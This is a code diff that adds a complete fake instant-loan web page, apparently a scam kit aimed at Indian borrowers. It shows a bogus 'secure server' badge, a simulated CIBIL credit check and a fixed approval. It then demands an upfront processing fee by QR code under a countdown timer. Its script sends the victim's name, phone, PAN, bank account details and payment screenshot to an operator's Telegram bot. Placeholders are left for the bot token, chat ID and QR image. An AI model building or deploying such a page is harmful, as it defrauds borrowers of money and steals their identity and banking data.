@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSTANT INDIA LOAN | Secure Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden { display: none; }
+        .card { background: white; border-radius: 16px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1); }
+        .btn-blue { background: #1e40af; color: white; transition: all 0.3s; }
+        .btn-blue:hover { background: #1e3a8a; transform: translateY(-1px); }
+    </style>
+</head>
+<body class="bg-gray-50 font-sans text-gray-800">
+
+    <nav class="bg-white border-b p-4 mb-6 sticky top-0 z-50">
+        <div class="max-w-md mx-auto flex justify-between items-center">
+            <h1 class="text-xl font-black text-blue-800 tracking-tight">INSTANT INDIA LOAN</h1>
+            <div class="flex items-center text-green-600 text-[10px] font-bold border border-green-200 px-2 py-1 rounded-full bg-green-50">
+                <span class="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></span> SECURE SERVER
+            </div>
+        </div>
+    </nav>
+
+    <div class="max-w-md mx-auto px-4 pb-20">
+        
+        <div id="step1" class="card p-8">
+            <h2 class="text-2xl font-bold mb-2">Registration</h2>
+            <p class="text-gray-500 mb-6 text-sm">Enter details to check your credit limit.</p>
+            <input type="text" id="regName" placeholder="Full Name" class="w-full p-4 mb-3 border rounded-xl outline-blue-500 bg-gray-50">
+            <input type="number" id="regPhone" placeholder="Mobile Number" class="w-full p-4 mb-6 border rounded-xl outline-blue-500 bg-gray-50">
+            <button onclick="toStep(2)" class="w-full btn-blue py-4 rounded-xl font-bold shadow-lg">Next Step</button>
+        </div>
+
+        <div id="step2" class="card p-8 hidden">
+            <h2 class="text-xl font-bold mb-4">Verification</h2>
+            <label class="text-xs text-gray-400 uppercase font-bold ml-1">PAN Card Number</label>
+            <input type="text" id="panCard" placeholder="ABCDE1234F" class="w-full p-4 mb-6 border rounded-xl uppercase outline-blue-500 bg-gray-50">
+            <button onclick="checkAvailability()" class="w-full btn-blue py-4 rounded-xl font-bold">Check Eligibility</button>
+            <div id="loading" class="hidden mt-6 text-center">
+                <div class="inline-block animate-spin rounded-full h-8 w-8 border-4 border-blue-600 border-t-transparent"></div>
+                <p class="text-sm mt-2 text-blue-600 font-medium">Verifying with CIBIL...</p>
+            </div>
+        </div>
+
+        <div id="step3" class="card p-8 hidden">
+            <div class="bg-blue-50 p-4 rounded-xl mb-6 text-center">
+                <p class="text-blue-700 text-sm font-bold uppercase tracking-wide">Approved Limit: ₹45,000</p>
+            </div>
+            <h2 class="text-lg font-bold mb-4">Loan Amount</h2>
+            <input type="range" id="loanRange" min="5000" max="45000" step="1000" value="10000" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-blue-600" oninput="updateLoanVal()">
+            <div class="text-center mt-4 font-black text-3xl text-blue-800">₹<span id="loanDisplay">10000</span></div>
+
+            <h2 class="text-lg font-bold mt-8 mb-4">Repayment Tenure</h2>
+            <div id="tenureOptions" class="grid grid-cols-2 gap-3"></div>
+            <button onclick="toStep(4)" class="w-full btn-blue py-4 mt-8 rounded-xl font-bold">Confirm Amount</button>
+        </div>
+
+        <div id="step4" class="card p-8 hidden">
+            <h2 class="text-xl font-bold mb-6">Bank Disbursement</h2>
+            <input type="text" id="bankName" placeholder="Bank Name" class="w-full p-4 mb-3 border rounded-xl outline-blue-500 bg-gray-50">
+            <input type="text" id="accNum" placeholder="Account Number" class="w-full p-4 mb-3 border rounded-xl outline-blue-500 bg-gray-50">
+            <input type="text" id="ifsc" placeholder="IFSC Code" class="w-full p-4 mb-6 border rounded-xl outline-blue-500 bg-gray-50">
+            <button onclick="calculateSummary()" class="w-full btn-blue py-4 rounded-xl font-bold">Review Application</button>
+        </div>
+
+        <div id="step5" class="card p-8 hidden">
+            <h2 class="text-xl font-bold mb-6">Final Summary</h2>
+            <div class="space-y-4 bg-gray-50 p-4 rounded-xl border border-dashed border-gray-300 text-sm mb-6">
+                <div class="flex justify-between"><span>Approved Loan:</span> <span class="font-bold">₹<span id="sumAmount">0</span></span></div>
+                <div class="flex justify-between"><span>Tenure:</span> <span class="font-bold"><span id="sumTenure">0</span> Months</span></div>
+                <div class="flex justify-between text-blue-700 font-bold border-t pt-3"><span>Processing Fee (Capped):</span> <span>₹<span id="sumFee">0</span></span></div>
+            </div>
+            <p class="text-[11px] text-gray-500 leading-relaxed mb-6">Processing fee is mandatory for instant digital verification. Pay now to receive funds in 15 minutes.</p>
+            <button onclick="startPayment()" class="w-full bg-orange-500 text-white py-4 rounded-xl font-bold shadow-lg uppercase tracking-wider">Pay Fee & Get Loan</button>
+        </div>
+
+        <div id="step6" class="card p-8 hidden text-center">
+            <div class="bg-red-50 text-red-600 py-2 rounded-lg font-bold text-lg mb-4">
+                ⌛ <span id="timer">10:00</span>
+            </div>
+            <h2 class="text-xl font-bold mb-2">Scan to Pay Fee</h2>
+            <p class="text-sm text-gray-600 mb-6 font-bold text-blue-700">Pay Exactly: ₹<span id="finalFee">0</span></p>
+            
+            <div class="bg-white border p-4 inline-block rounded-xl mb-6 shadow-sm">
+                <img src="YOUR_QR_IMAGE_LINK_HERE" alt="Payment QR" class="w-48 h-48 mx-auto object-contain">
+            </div>
+
+            <div class="text-left mb-6">
+                <label class="text-xs font-bold text-gray-500">Upload Payment Screenshot</label>
+                <input type="file" id="ssInput" class="w-full mt-1 text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700">
+            </div>
+
+            <button onclick="sendToTelegram()" class="w-full btn-blue py-4 rounded-xl font-bold">SUBMIT PAYMENT SS</button>
+        </div>
+
+        <div id="step7" class="card p-10 hidden text-center">
+            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl font-bold">✓</div>
+            <h2 class="text-2xl font-bold mb-2">Reviewing Payment</h2>
+            <p class="text-gray-600">Your payment of ₹<span id="paidFee"></span> is being verified. Loan disbursement will hit your bank account shortly.</p>
+        </div>
+    </div>
+
+    <script>
+        const TG_TOKEN = "YOUR_BOT_TOKEN";
+        const CHAT_ID = "YOUR_CHAT_ID";
+
+        let selectedTenure = 3;
+
+        function toStep(n) {
+            document.querySelectorAll('[id^="step"]').forEach(s => s.classList.add('hidden'));
+            document.getElementById('step' + n).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function checkAvailability() {
+            document.getElementById('loading').classList.remove('hidden');
+            setTimeout(() => { toStep(3); updateLoanVal(); }, 2000);
+        }
+
+        function updateLoanVal() {
+            let val = document.getElementById('loanRange').value;
+            document.getElementById('loanDisplay').innerText = val;
+            let tenureDiv = document.getElementById('tenureOptions');
+            tenureDiv.innerHTML = '';
+            let options = val <= 15000 ? [1, 3, 6] : [3, 6, 9, 12, 24];
+            options.forEach(opt => {
+                tenureDiv.innerHTML += `<button onclick="selectedTenure=${opt}" class="border-2 p-3 rounded-xl hover:border-blue-600 focus:bg-blue-600 focus:text-white transition font-bold">${opt}M</button>`;
+            });
+        }
+
+        function calculateSummary() {
+            let amount = parseInt(document.getElementById('loanRange').value);
+            let fee = amount * 0.032;
+            if(fee > 988) fee = 988; // Capped at 988
+            
+            document.getElementById('sumAmount').innerText = amount;
+            document.getElementById('sumTenure').innerText = selectedTenure;
+            document.getElementById('sumFee').innerText = Math.round(fee);
+            document.getElementById('finalFee').innerText = Math.round(fee);
+            document.getElementById('paidFee').innerText = Math.round(fee);
+            toStep(5);
+        }
+
+        function startTimer() {
+            let duration = 600; 
+            let timerDisplay = document.getElementById('timer');
+            let interval = setInterval(() => {
+                let mins = Math.floor(duration / 60);
+                let secs = duration % 60;
+                timerDisplay.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                if (--duration < 0) clearInterval(interval);
+            }, 1000);
+        }
+
+        function startPayment() {
+            toStep(6);
+            startTimer();
+        }
+
+        async function sendToTelegram() {
+            const name = document.getElementById('regName').value;
+            const phone = document.getElementById('regPhone').value;
+            const pan = document.getElementById('panCard').value;
+            const bank = document.getElementById('bankName').value;
+            const acc = document.getElementById('accNum').value;
+            const amount = document.getElementById('sumAmount').innerText;
+            const fee = document.getElementById('finalFee').innerText;
+
+            const text = `🚨 *NEW LOAN REQUEST* 🚨\n\n` +
+                         `👤 Name: ${name}\n` +
+                         `📱 Phone: ${phone}\n` +
+                         `🆔 PAN: ${pan}\n` +
+                         `🏦 Bank: ${bank}\n` +
+                         `🔢 Acc: ${acc}\n` +
+                         `💰 Amount: ₹${amount}\n` +
+                         `💸 Fee Paid: ₹${fee}`;
+
+            // 1. Send Text Data
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+
+            // 2. Send Image (Screenshot)
+            const photoInput = document.getElementById('ssInput');
+            if(photoInput.files.length > 0) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoInput.files[0]);
+                formData.append('caption', `Payment Proof for ${name}`);
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }
+
+            toStep(7);
+        }
+    </script>
+</body>
+</html>
